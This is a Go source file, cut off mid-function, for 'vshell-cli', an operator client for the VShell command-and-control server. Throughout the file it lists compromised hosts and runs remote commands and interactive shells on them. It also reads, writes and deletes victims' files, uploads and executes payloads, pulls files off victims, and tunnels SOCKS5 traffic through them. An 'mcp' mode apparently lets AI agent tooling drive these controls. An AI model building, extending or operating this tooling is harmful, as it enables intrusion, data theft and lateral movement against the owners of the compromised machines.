package main

import (
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode/utf8"
)

const version = "0.1.1"

type Config struct {
	URL         string
	User        string
	Pass        string
	ConfigFile  string
	JSON        bool
	Insecure    bool
	HTTPTimeout time.Duration
	Help        bool
	Version     bool
}

type headerList []string

func (h *headerList) String() string { return strings.Join(*h, ", ") }
func (h *headerList) Set(v string) error {
	*h = append(*h, v)
	return nil
}

func main() {
	cfg, rest, err := parseGlobals(os.Args[1:])
	if err != nil {
		usageErr(err)
	}
	if cfg.Version {
		fmt.Println("vshell-cli", version)
		return
	}
	if cfg.Help {
		printHelp()
		return
	}
	if len(rest) == 0 {
		runSetup(cfg)
		return
	}
	cmdName, args := rest[0], rest[1:]
	if cmdName == "help" {
		printHelp()
		return
	}
	if !knownCommand(cmdName) {
		usageErr(fmt.Errorf("未知命令: %s", cmdName))
	}

	exists, err := applyConfigFile(cfg)
	if err != nil {
		fail(fmt.Errorf("读取 %s: %w", displayPath(cfg.ConfigFile), err))
	}
	if exists {
		warnConfigPermissions(cfg.ConfigFile)
	}
	if commandNeedsAuth(cmdName) && !exists && cfg.URL == "" && cfg.User == "" && cfg.Pass == "" {
		created, cerr := ensureConfigTemplate(cfg.ConfigFile)
		if cerr != nil {
			fail(fmt.Errorf("创建 %s: %w", displayPath(cfg.ConfigFile), cerr))
		}
		if created {
			printHelp()
			printConfigSetup(os.Stderr, cfg.ConfigFile)
			os.Exit(2)
		}
	}
	if cmdName == "mcp" && !exists {
		usageErr(errors.New("mcp 需要 config.ini：请先直接运行 vshell-cli 生成并填写配置"))
	}
	if cmdName == "mcp" {
		fc, _, err := readConfigFile(cfg.ConfigFile)
		if err != nil {
			fail(fmt.Errorf("读取 %s: %w", displayPath(cfg.ConfigFile), err))
		}
		if fc.URL == "" || fc.User == "" || fc.Pass == "" {
			usageErr(errors.New("mcp 需要 config.ini 中完整填写 url、username、password（配置片段只引用该文件）"))
		}
	}

	if cfg.URL == "" && cmdName != "send" && cmdName != "compare" {
		usageErr(errors.New("缺少 VShell 地址（--url、VSHELL_URL 或 config.ini 的 [vshell] url）"))
	}
	if commandNeedsAuth(cmdName) {
		if cfg.User == "" {
			usageErr(errors.New("缺少用户名（--user、VSHELL_USER 或 config.ini 的 [vshell] username）"))
		}
		if cfg.Pass == "" {
			if cmdName == "mcp" {
				usageErr(errors.New("mcp 需要配置文件中的 password（stdio 模式无法交互输入）"))
			}
			p, err := promptPassword()
			if err != nil {
				fail(err)
			}
			cfg.Pass = p
		}
	}

	c := NewClient(cfg)

	var runErr error
	switch cmdName {
	case "info":
		runErr = cmdInfo(cfg, c)
	case "clients":
		runErr = cmdClients(cfg, c, args)
	case "exec":
		runErr = cmdExec(cfg, c, args)
	case "exec-async":
		runErr = cmdExecAsync(cfg, c, args)
	case "shell":
		runErr = cmdShell(cfg, c, args)
	case "disks":
		runErr = cmdDisks(cfg, c, args)
	case "ls":
		runErr = cmdLs(cfg, c, args)
	case "cat":
		runErr = cmdCat(cfg, c, args)
	case "write":
		runErr = cmdWrite(cfg, c, args)
	case "rm":
		runErr = cmdRm(cfg, c, args)
	case "upload":
		runErr = cmdUpload(cfg, c, args)
	case "download":
		runErr = cmdDownload(cfg, c, args)
	case "deploy":
		runErr = cmdDeploy(cfg, c, args)
	case "socks":
		runErr = cmdSocks(cfg, c, args)
	case "listeners":
		runErr = cmdListeners(cfg, c)
	case "runners":
		runErr = cmdRunners(cfg, c)
	case "send":
		runErr = cmdSend(cfg, c, args)
	case "compare":
		runErr = cmdCompare(cfg, c, args)
	case "diagnose":
		runErr = cmdDiagnose(cfg, c)
	case "mcp":
		runErr = cmdMCP(cfg, c, args)
	case "help":
		printHelp()
	default:
		usageErr(fmt.Errorf("未知命令: %s", cmdName))
	}
	if runErr != nil {
		fail(runErr)
	}
}

// runSetup 用于不带命令的首次运行：创建配置模板、显示命令列表和当前配置。
func runSetup(cfg *Config) {
	exists, err := applyConfigFile(cfg)
	if err != nil {
		fail(fmt.Errorf("读取 %s: %w", displayPath(cfg.ConfigFile), err))
	}
	created := false
	var createErr error
	if !exists {
		created, createErr = ensureConfigTemplate(cfg.ConfigFile)
		if createErr == nil && created {
			exists = true
		}
	}
	if exists {
		warnConfigPermissions(cfg.ConfigFile)
	}
	printHelp()
	printConfigSummary(cfg, exists, created, createErr)
}

func knownCommand(cmd string) bool {
	switch cmd {
	case "info", "clients", "exec", "exec-async", "shell", "disks", "ls", "cat",
		"write", "rm", "upload", "download", "deploy", "socks",
		"listeners", "runners", "send", "compare", "diagnose", "mcp", "help":
		return true
	}
	return false
}

func commandNeedsAuth(cmd string) bool {
	switch cmd {
	case "send", "compare", "diagnose", "help":
		return false
	}
	return true
}

// ---------------- 全局参数 ----------------

func parseGlobals(args []string) (*Config, []string, error) {
	cfg := &Config{
		URL:         os.Getenv("VSHELL_URL"),
		User:        os.Getenv("VSHELL_USER"),
		Pass:        os.Getenv("VSHELL_PASS"),
		ConfigFile:  os.Getenv("VSHELL_CONFIG"),
		HTTPTimeout: 60 * time.Second,
	}

	i := 0
	for ; i < len(args); i++ {
		a := args[i]
		if !strings.HasPrefix(a, "-") {
			break
		}
		key, val, hasVal := splitFlag(a)
		take := func() (string, error) {
			if hasVal {
				return val, nil
			}
			if i+1 >= len(args) {
				return "", fmt.Errorf("%s 需要一个参数", key)
			}
			i++
			return args[i], nil
		}
		switch key {
		case "--url":
			v, err := take()
			if err != nil {
				return nil, nil, err
			}
			cfg.URL = v
		case "--user", "--username":
			v, err := take()
			if err != nil {
				return nil, nil, err
			}
			cfg.User = v
		case "--password", "--pass":
			v, err := take()
			if err != nil {
				return nil, nil, err
			}
			cfg.Pass = v
		case "--config":
			v, err := take()
			if err != nil {
				return nil, nil, err
			}
			cfg.ConfigFile = v
		case "--http-timeout":
			v, err := take()
			if err != nil {
				return nil, nil, err
			}
			secs, err := strconv.ParseFloat(v, 64)
			if err != nil || secs <= 0 {
				return nil, nil, fmt.Errorf("--http-timeout 需要正数秒: %s", v)
			}
			cfg.HTTPTimeout = time.Duration(secs * float64(time.Second))
		case "--json":
			cfg.JSON = true
		case "--insecure":
			cfg.Insecure = true
		case "--help", "-h":
			cfg.Help = true
		case "--version":
			cfg.Version = true
		default:
			return nil, nil, fmt.Errorf("未知全局参数: %s（全局参数需放在命令之前）", a)
		}
	}
	if cfg.ConfigFile == "" {
		cfg.ConfigFile = defaultConfigFile
	}
	return cfg, args[i:], nil
}

func splitFlag(a string) (key, val string, hasVal bool) {
	if !strings.HasPrefix(a, "--") {
		return a, "", false
	}
	if i := strings.IndexByte(a, '='); i > 0 {
		return a[:i], a[i+1:], true
	}
	return a, "", false
}

func newFlagSet(name string) *flag.FlagSet {
	fs := flag.NewFlagSet(name, flag.ContinueOnError)
	fs.SetOutput(io.Discard)
	return fs
}

// ---------------- 命令实现 ----------------

func cmdInfo(cfg *Config, c *Client) error {
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	d, err := c.Dashboard()
	if err != nil {
		return err
	}
	if cfg.JSON {
		emit(cfg, map[string]any{"url": cfg.URL, "dashboard": d}, "")
		return nil
	}
	fmt.Printf("VShell C2 运行中\n"+
		"  URL: %s\n"+
		"  版本: %s\n"+
		"  在线 Agent: %d\n"+
		"  监听器: %d/%d 在线\n"+
		"  SOCKS5 隧道: %d\n"+
		"  授权截止: %s\n",
		cfg.URL, orDash(d.Version), d.ClientOnlineCount,
		d.ListenerOnlineCount, d.ListenerCount, d.Socks5Count, orDash(d.LicTime))
	return nil
}

func cmdClients(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("clients")
	status := fs.String("status", "online", "online|offline|all")
	if err := fs.Parse(args); err != nil {
		return err
	}
	st, err := normalizeStatus(*status)
	if err != nil {
		return err
	}
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	list, err := c.Agents(st)
	if err != nil {
		return err
	}
	if cfg.JSON {
		emit(cfg, list, "")
		return nil
	}
	if len(list.Items) == 0 {
		fmt.Printf("没有客户端 (total=%d, online=%d)\n", list.Total, list.ClientOnlineCount)
		return nil
	}
	rows := make([][]string, 0, len(list.Items))
	for _, a := range list.Items {
		flagMark := "-"
		if a.IsConnect {
			flagMark = "+"
		}
		rows = append(rows, []string{
			flagMark, fmt.Sprint(a.ID), orDash(a.HostName), orDash(a.LocalIP),
			orDash(a.Addr), orDash(a.OsName),
		})
	}
	fmt.Println(table([]string{"", "ID", "主机名", "内网IP", "地址", "系统"}, rows))
	fmt.Printf("总计: %d, 在线: %d\n", list.Total, list.ClientOnlineCount)
	return nil
}

func cmdExec(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("exec")
	timeout := fs.Float64("timeout", 30, "命令等待秒数")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 2 {
		return errors.New("用法: exec [--timeout 30] <agent_id> <command...>")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}
	command := strings.Join(pos[1:], " ")
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	raw, err := c.ExecShell(id, command, time.Duration(*timeout*float64(time.Second)))
	if err != nil {
		var se *ShellError
		if errors.As(err, &se) && strings.TrimSpace(se.Output) != "" {
			fmt.Println(extractShellOutput(se.Output, command))
		}
		return err
	}
	out := extractShellOutput(raw, command)
	if cfg.JSON {
		emit(cfg, map[string]any{
			"client_id": id, "command": command, "output": out, "raw": raw,
		}, "")
		return nil
	}
	fmt.Println(out)
	return nil
}

func cmdExecAsync(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("exec-async")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 2 {
		return errors.New("用法: exec-async <agent_id> <command...>")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}
	command := strings.Join(pos[1:], " ")
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	if err := c.ExecAsync(id, command); err != nil {
		return err
	}
	emit(cfg, map[string]any{"client_id": id, "command": command, "sent": true},
		fmt.Sprintf("命令已异步发送到 Agent %d: %s", id, command))
	return nil
}

func cmdShell(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("shell")
	timeout := fs.Float64("timeout", 60, "单条命令等待秒数")
	raw := fs.Bool("raw", false, "显示原始终端缓冲区")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 1 {
		return errors.New("用法: shell <agent_id> [--timeout 60] [--raw]")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	return runShell(c, id, time.Duration(*timeout*float64(time.Second)), *raw,
		os.Stdin, os.Stdout, isTTY(os.Stdin))
}

func cmdDisks(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("disks")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 1 {
		return errors.New("用法: disks <agent_id>")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	disks, err := c.Disks(id)
	if err != nil {
		return err
	}
	if cfg.JSON {
		emit(cfg, disks, "")
		return nil
	}
	if len(disks) == 0 {
		fmt.Println("(无磁盘信息)")
		return nil
	}
	rows := make([][]string, 0, len(disks))
	for _, d := range disks {
		rows = append(rows, []string{orDash(d.Name), fmt.Sprint(d.IsDir), fmt.Sprint(d.Size)})
	}
	fmt.Println(table([]string{"名称", "是目录", "大小"}, rows))
	return nil
}

func cmdLs(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("ls")
	page := fs.Int("page", 1, "页码")
	pageSize := fs.Int("page-size", 100, "每页数量")
	sortBy := fs.String("sort-by", "time", "name|time|size")
	order := fs.String("order", "descend", "ascend|descend")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 2 {
		return errors.New("用法: ls [--page 1] [--page-size 100] <agent_id> <path>")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	list, err := c.ListDir(id, pos[1], *page, *pageSize, *sortBy, *order)
	if err != nil {
		return err
	}
	if cfg.JSON {
		emit(cfg, list, "")
		return nil
	}
	if len(list.Items) == 0 {
		fmt.Printf("目录为空或不存在: %s\n", pos[1])
		return nil
	}
	rows := make([][]string, 0, len(list.Items))
	for _, f := range list.Items {
		t := "F"
		if f.IsDir {
			t = "D"
		}
		rows = append(rows, []string{t, orDash(f.Name), fmt.Sprint(f.Size), orDash(f.Time)})
	}
	fmt.Printf("%s (%d 项):\n\n", pos[1], len(list.Items))
	fmt.Println(table([]string{"类型", "名称", "大小", "修改时间"}, rows))
	return nil
}

func cmdCat(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("cat")
	maxBytes := fs.Int("max-bytes", 102400, "最多输出字节数")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 2 {
		return errors.New("用法: cat [--max-bytes 102400] <agent_id> <remote_file>")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	data, err := c.ReadFile(id, pos[1])
	if err != nil {
		return err
	}
	total := len(data)
	truncated := false
	if total > *maxBytes {
		data = data[:*maxBytes]
		truncated = true
	}
	valid := utf8.Valid(data)
	if cfg.JSON {
		out := map[string]any{
			"client_id": id, "path": pos[1], "size": total,
			"shown": len(data), "truncated": truncated, "binary": !valid,
		}
		if valid {
			out["content"] = string(data)
		} else {
			out["base64"] = base64.StdEncoding.EncodeToString(data)
		}
		emit(cfg, out, "")
		return nil
	}
	if !valid {
		fmt.Printf("(二进制内容, %d bytes, base64)\n%s\n", len(data), base64.StdEncoding.EncodeToString(data))
		return nil
	}
	fmt.Print(string(data))
	if truncated {
		fmt.Printf("\n...(已截断，共 %d bytes)\n", total)
	}
	return nil
}

func cmdWrite(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("write")
	content := fs.String("content", "", "文件内容")
	contentShort := fs.String("c", "", "文件内容（简写）")
	file := fs.String("file", "", "从本地文件读取内容")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 2 {
		return errors.New("用法: write <agent_id> <remote_path> (--content <text> | --file <local>)")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}

	set := map[string]bool{}
	fs.Visit(func(f *flag.Flag) { set[f.Name] = true })
	var body string
	switch {
	case *file != "":
		b, err := os.ReadFile(*file)
		if err != nil {
			return fmt.Errorf("读取本地文件失败: %w", err)
		}
		body = string(b)
	case set["content"]:
		body = *content
	case set["c"]:
		body = *contentShort
	default:
		return errors.New("需要 --content 或 --file")
	}

	if err := c.EnsureLogin(); err != nil {
		return err
	}
	if err := c.WriteFile(id, pos[1], body); err != nil {
		return err
	}
	emit(cfg, map[string]any{"client_id": id, "path": pos[1], "bytes": len(body), "ok": true},
		fmt.Sprintf("文件已写入 Agent %d: %s (%d bytes)", id, pos[1], len(body)))
	return nil
}

func cmdRm(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("rm")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 2 {
		return errors.New("用法: rm <agent_id> <path>")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	if err := c.RemoveFile(id, pos[1]); err != nil {
		return err
	}
	emit(cfg, map[string]any{"client_id": id, "path": pos[1], "deleted": true},
		fmt.Sprintf("已删除: %s", pos[1]))
	return nil
}

func cmdUpload(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("upload")
	remote := fs.String("remote", "", "远程保存路径（默认用本地文件名）")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 2 {
		return errors.New("用法: upload <agent_id> <local_file> [--remote C:/path/file]")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	resp, err := c.Upload(id, pos[1], *remote, 120*time.Second)
	if err != nil {
		return err
	}
	if !resp.OK() {
		return errors.New(resp.ErrText())
	}
	url := resp.URL
	if url == "" {
		url = *remote
		if url == "" {
			url = filepath.Base(pos[1])
		}
	}
	emit(cfg, map[string]any{"client_id": id, "local": pos[1], "remote": url, "ok": true},
		fmt.Sprintf("上传成功: %s -> %s", pos[1], url))
	return nil
}

func cmdDownload(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("download")
	wait := fs.Float64("wait", 30, "等待下载完成的最大秒数")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 2 {
		return errors.New("用法: download [--wait 30] <agent_id> <remote_file>")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}

	var progress func(int)
	if !cfg.JSON {
		progress = func(p int) { fmt.Fprintf(os.Stderr, "\r进度: %d%%", p) }
	}
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	size, err := c.DownloadFromAgent(id, pos[1], time.Duration(*wait*float64(time.Second)), progress)
	if progress != nil {
		fmt.Fprintln(os.Stderr)
	}
	if err != nil {
		return err
	}
	emit(cfg, map[string]any{"client_id": id, "remote": pos[1], "size": size, "ok": true},
		fmt.Sprintf("下载完成!\n  文件: %s\n  大小: %d bytes\n  Agent: %d", pos[1], size, id))
	return nil
}

func cmdDeploy(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("deploy")
	local := fs.String("local", "", "本地文件（留空则跳过上传）")
	remote := fs.String("remote", "", "远程保存/执行路径")
	execArgs := fs.String("args", "", "执行参数")
	noExec := fs.Bool("no-exec", false, "只上传不执行")
	skipUpload := fs.Bool("skip-upload", false, "跳过上传，直接执行远程路径")
	timeout := fs.Float64("timeout", 120, "执行等待秒数")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 1 {
		return errors.New("用法: deploy <agent_id> [--local <file>] [--remote <path>] [--args <args>] [--no-exec] [--skip-upload]")
	}
	id, err := parseID(pos[0])
	if err != nil {
		return err
	}

	remotePath := *remote
	uploaded := false

	if *local == "" && remotePath == "" {
		return errors.New("需要 --local 或 --remote")
	}
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	if *local != "" {
		if remotePath == "" {
			remotePath = filepath.Base(*local)
		}
		if !*skipUpload {
			resp, err := c.Upload(id, *local, remotePath, 120*time.Second)
			if err != nil {
				return err
			}
			if !resp.OK() {
				return errors.New(resp.ErrText())
			}
			uploaded = true
		}
	}
	if *noExec {
		emit(cfg, map[string]any{
			"client_id": id, "remote": remotePath, "uploaded": uploaded, "executed": false,
		}, fmt.Sprintf("已部署到 Agent %d: %s（未执行）", id, remotePath))
		return nil
	}

	command := strings.TrimSpace(remotePath + " " + *execArgs)
	raw, err := c.ExecShell(id, command, time.Duration(*timeout*float64(time.Second)))
	if err != nil {
		var se *ShellError
		if errors.As(err, &se) && strings.TrimSpace(se.Output) != "" {
			fmt.Println(extractShellOutput(se.Output, command))
		}
		return err
	}
	out := extractShellOutput(raw, command)
	out = truncate(out, 8000)
	if cfg.JSON {
		emit(cfg, map[string]any{
			"client_id": id, "remote": remotePath, "uploaded": uploaded,
			"executed": true, "command": command, "output": out,
		}, "")
		return nil
	}
	if uploaded {
		fmt.Printf("已部署到 Agent %d: %s\n", id, remotePath)
	}
	fmt.Printf("执行: %s\n%s\n", command, out)
	return nil
}

func cmdSocks(cfg *Config, c *Client, args []string) error {
	if len(args) == 0 {
		return errors.New("用法: socks start|stop|list|curl ...")
	}
	sub := args[0]
	rest := args[1:]

	switch sub {
	case "start":
		fs := newFlagSet("socks start")
		port := fs.Int("port", 0, "本地端口（0=自动分配）")
		force := fs.Bool("force", false, "端口已存在时先清理再重建")
		if err := fs.Parse(rest); err != nil {
			return err
		}
		pos := fs.Args()
		if len(pos) < 1 {
			return errors.New("用法: socks start <agent_id> [--port 1080] [--force]")
		}
		id, err := parseID(pos[0])
		if err != nil {
			return err
		}
		p := *port
		if p == 0 {
			p, err = freePort()
			if err != nil {
				return fmt.Errorf("分配本地端口失败: %w", err)
			}
		}
		if *force {
			_, _ = c.StopTunnelByPort(p)
		}
		if err := c.EnsureLogin(); err != nil {
			return err
		}
		tunnelID, err := c.StartTunnel(id, p)
		if err != nil {
			return err
		}
		if cfg.JSON {
			emit(cfg, map[string]any{"client_id": id, "port": p, "tunnel_id": tunnelID, "ok": true}, "")
			return nil
		}
		fmt.Printf("SOCKS5 隧道已建立\n"+
			"  Agent: %d\n"+
			"  隧道ID: %v\n"+
			"  端口: %d\n"+
			"  使用: vshell-cli socks curl %d http://target\n"+
			"  或: curl --socks5 127.0.0.1:%d http://target\n"+
			"  停止: vshell-cli socks stop %d\n",
			id, tunnelID, p, p, p, p)
		return nil

	case "stop":
		fs := newFlagSet("socks stop")
		if err := fs.Parse(rest); err != nil {
			return err
		}
		pos := fs.Args()
		if len(pos) < 1 {
			return errors.New("用法: socks stop <port>")
		}
		port, err := strconv.Atoi(pos[0])
		if err != nil {
			return fmt.Errorf("端口无效: %s", pos[0])
		}
		if err := c.EnsureLogin(); err != nil {
			return err
		}
		tunnelID, err := c.StopTunnelByPort(port)
		if err != nil {
			return err
		}
		emit(cfg, map[string]any{"port": port, "tunnel_id": tunnelID, "stopped": true},
			fmt.Sprintf("SOCKS5 隧道已停止 (端口 %d)", port))
		return nil

	case "list":
		if err := c.EnsureLogin(); err != nil {
			return err
		}
		list, err := c.Tunnels(0)
		if err != nil {
			return err
		}
		if cfg.JSON {
			emit(cfg, list, "")
			return nil
		}
		if len(list.Items) == 0 {
			fmt.Println("没有隧道")
			return nil
		}
		rows := make([][]string, 0, len(list.Items))
		for _, t := range list.Items {
			mark := "-"
			if t.RunStatus {
				mark = "+"
			}
			rows = append(rows, []string{
				mark, fmt.Sprint(t.ID), fmt.Sprint(t.ClientID),
				fmt.Sprint(t.Port), orDash(t.Mode), orDash(t.Remark),
			})
		}
		fmt.Println(table([]string{"", "ID", "Agent", "端口", "模式", "备注"}, rows))
		return nil

	case "curl":
		fs := newFlagSet("socks curl")
		method := fs.String("method", "GET", "HTTP 方法")
		timeout := fs.Float64("timeout", 30, "超时秒数")
		var headers headerList
		fs.Var(&headers, "H", "请求头，可重复，如 -H 'X-Test: 1'")
		data := fs.String("data", "", "请求体")
		if err := fs.Parse(rest); err != nil {
			return err
		}
		pos := fs.Args()
		if len(pos) < 2 {
			return errors.New("用法: socks curl <port> <url> [--method GET] [-H 'K: V'] [--data ...]")
		}
		port, err := strconv.Atoi(pos[0])
		if err != nil {
			return fmt.Errorf("端口无效: %s", pos[0])
		}
		if err := c.EnsureLogin(); err != nil {
			return err
		}
		res, _ := c.TunnelHTTP(port, strings.ToUpper(*method), pos[1], headers, *data,
			time.Duration(*timeout*float64(time.Second)))
		if cfg.JSON {
			emit(cfg, res, "")
			if !res.OK {
				return errors.New(res.Error)
			}
			return nil
		}
		if !res.OK {
			return errors.New("隧道请求失败: " + res.Error)
		}
		fmt.Printf("状态码: %d  耗时: %.2fs  大小: %d bytes\n---\n%s\n",
			res.Status, res.Elapsed, res.Size, truncate(res.Body, 6000))
		return nil
	}

	return fmt.Errorf("未知 socks 子命令: %s", sub)
}

func cmdListeners(cfg *Config, c *Client) error {
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	items, err := c.Listeners()
	if err != nil {
		return err
	}
	if cfg.JSON {
		emit(cfg, items, "")
		return nil
	}
	if len(items) == 0 {
		fmt.Println("没有监听器")
		return nil
	}
	rows := make([][]string, 0, len(items))
	for _, l := range items {
		mark := "-"
		if l.Status {
			mark = "+"
		}
		rows = append(rows, []string{
			mark, fmt.Sprint(l.ID), orDash(l.Mode),
			orDash(l.ListenAddr), orDash(l.ConnectAddr), orDash(l.Remark),
		})
	}
	fmt.Println(table([]string{"", "ID", "模式", "监听地址", "连接地址", "备注"}, rows))
	return nil
}

func cmdRunners(cfg *Config, c *Client) error {
	if err := c.EnsureLogin(); err != nil {
		return err
	}
	items, err := c.Runners()
	if err != nil {
		return err
	}
	if cfg.JSON {
		emit(cfg, items, "")
		return nil
	}
	if len(items) == 0 {
		fmt.Println("没有可用工具")
		return nil
	}
	rows := make([][]string, 0, len(items))
	for _, r := range items {
		rows = append(rows, []string{fmt.Sprint(r.ID), orDash(r.Name)})
	}
	fmt.Println(table([]string{"ID", "名称"}, rows))
	return nil
}

func cmdSend(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("send")
	method := fs.String("method", "GET", "HTTP 方法")
	engine := fs.String("engine", "direct", "direct|curl")
	timeout := fs.Float64("timeout", 30, "超时秒数")
	var headers headerList
	fs.Var(&headers, "H", "请求头，可重复")
	body := fs.String("body", "", "请求体")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 1 {
		return errors.New("用法: send <url> [--method GET] [--engine direct|curl] [-H 'K: V'] [--body ...]")
	}
	res := c.ExecuteHTTP(*engine, strings.ToUpper(*method), pos[0], headers, *body,
		time.Duration(*timeout*float64(time.Second)))

	if cfg.JSON {
		emit(cfg, map[string]any{"url": pos[0], "result": res}, "")
		if !res.OK {
			return errors.New(res.Error)
		}
		return nil
	}
	if !res.OK {
		return fmt.Errorf("%s 请求失败: %s", *engine, res.Error)
	}
	fmt.Printf("%s: %s %s\n"+
		"  状态码: %d\n"+
		"  耗时: %.2fs\n"+
		"  响应体: %d bytes\n"+
		"  ---\n%s\n",
		res.Engine, strings.ToUpper(*method), pos[0], res.Status, res.Elapsed,
		res.Size, truncate(res.Body, 2000))
	return nil
}

func cmdCompare(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("compare")
	method := fs.String("method", "GET", "HTTP 方法")
	timeout := fs.Float64("timeout", 30, "超时秒数")
	var headers headerList
	fs.Var(&headers, "H", "请求头，可重复")
	body := fs.String("body", "", "请求体")
	if err := fs.Parse(args); err != nil {
		return err
	}
	pos := fs.Args()
	if len(pos) < 1 {
		return errors.New("用法: compare <url> [--method GET] [-H 'K: V'] [--body ...]")
	}
	url := pos[0]
	to := time.Duration(*timeout * float64(time.Second))

	results := make([]HTTPResult, 2)
	var wg sync.WaitGroup
	run := func(i int, engine string) {
		defer wg.Done()
		results[i] = c.ExecuteHTTP(engine, strings.ToUpper(*method), url, headers, *body, to)
	}
	wg.Add(2)
	go run(0, "direct")
	go run(1, "curl")
	wg.Wait()

	statuses := map[int]bool{}
	for _, r := range results {
		if r.OK {
			statuses[r.Status] = true
		}
	}
	mismatch := len(statuses) > 1

	var headerDiffs map[string]string
	if results[0].OK && results[1].OK {
		headerDiffs = map[string]string{}
		keys := map[string]bool{}
		for k := range results[0].Headers {
			keys[k] = true
		}
		for k := range results[1].Headers {
			keys[k] = true
		}
		for k := range keys {
			direct, curlVal := results[0].Headers[k], results[1].Headers[k]
			if direct != curlVal {
				headerDiffs[k] = "direct=" + orDash(direct) + "  curl=" + orDash(curlVal)
			}
		}
	}

	if cfg.JSON {
		emit(cfg, map[string]any{
			"url": url, "results": results,
			"status_mismatch": mismatch, "header_diffs": headerDiffs,
		}, "")
		return nil
	}

	rows := make([][]string, 0, len(results))
	for _, r := range results {
		if r.OK {
			rows = append(rows, []string{
				r.Engine, fmt.Sprint(r.Status),
				fmt.Sprintf("%.3fs", r.Elapsed), fmt.Sprintf("%d", r.Size),
			})
		} else {
			rows = append(rows, []string{r.Engine, "-", "-", r.Error})
		}
	}
	fmt.Printf("多引擎 HTTP 对比: %s %s\n\n", strings.ToUpper(*method), url)
	fmt.Println(table([]string{"引擎", "状态码", "耗时", "大小/错误"}, rows))
	if mismatch {
		fmt.Printf("\n** 状态码不一致: %v **\n", statuses)
	}
	if len(headerDiffs) > 0 {
		fmt.Println("\n响应头差异 (direct vs curl):")
		for k, v := range headerDiffs {
			fmt.Printf("  %s: %s\n", k, v)
		}
	}
	if results[0].OK && results[1].OK && results[0].Body != results[1].Body {
		fmt.Println("\n** 响应体内容不同 **")
	}
	return nil
}

func cmdDiagnose(cfg *Config, c *Client) error {
	type report struct {
		VShellOK   bool       `json:"vshell_ok"`
		Dashboard  *Dashboard `json:"dashboard,omitempty"`
		VShellErr  string     `json:"vshell_error,omitempty"`
		CurlOK     bool       `json:"curl_ok"`
		CurlVer    string     `json:"curl_version,omitempty"`
		CLIVersion string     `json:"cli_version"`
	}
	rep := report{CLIVersion: version}

	if err := c.EnsureLogin(); err != nil {
		rep.VShellErr = "登录失败: " + err.Error()
	} else if d, err := c.Dashboard(); err == nil {
		rep.VShellOK = true
		rep.Dashboard = d
	} else {
		rep.VShellErr = err.Error()
	}
	if v, err := curlVersion(); err == nil {
		rep.CurlOK = true
		rep.CurlVer = v
	}

	if cfg.JSON {
		emit(cfg, rep, "")
		return nil
	}
	fmt.Println("诊断报告")
	fmt.Println(strings.Repeat("=", 40))
	if rep.VShellOK {
		fmt.Printf("VShell C2 (%s): 正常\n  版本: %s\n  Agent: %d 在线 / %d 总数\n",
			cfg.URL, orDash(rep.Dashboard.Version),
			rep.Dashboard.ClientOnlineCount, rep.Dashboard.ClientCount)
	} else {
		fmt.Printf("VShell C2 (%s): %s\n", cfg.URL, rep.VShellErr)
	}
	if rep.CurlOK {
		fmt.Printf("curl: %s\n", rep.CurlVer)
	} else {
		fmt.Println("curl: 不可用")
	}
	fmt.Printf("vshell-cli: %s\n", version)
	return nil
}

// ---------------- 辅助 ----------------

var promptRe = regexp.MustCompile(`(?m)\r?\n[A-Za-z]:\\[^\r\n>]*>`)

// extractShellOutput 从终端缓冲区中尽量提取命令输出。
func extractShellOutput(raw, command string) string {
